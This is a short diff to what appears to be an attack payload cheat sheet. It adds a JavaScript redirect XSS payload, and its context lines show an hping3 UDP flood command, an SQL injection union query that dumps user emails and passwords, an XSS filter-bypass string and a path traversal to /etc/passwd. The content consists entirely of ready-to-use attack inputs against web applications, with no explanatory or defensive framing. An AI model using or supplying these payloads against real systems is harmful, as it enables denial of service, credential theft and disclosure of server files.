@@ -30,6 +30,7 @@ UDP(Volume Based Attack) : hping3 --UDP --flood -p 80 <TARGET>
 ') union select 1,email,password,4,5,6,7 from users;--  
 ## XSS
 <<script>alert("XSS")</script>script>alert("XSS")<</script>/script>  
+<script> window.location='http://www.google.com'</script>  
 ## Local File Inclusion
 ../../../../../../../../../../etc/passwd  
 ## LFI&RFI&SSRF
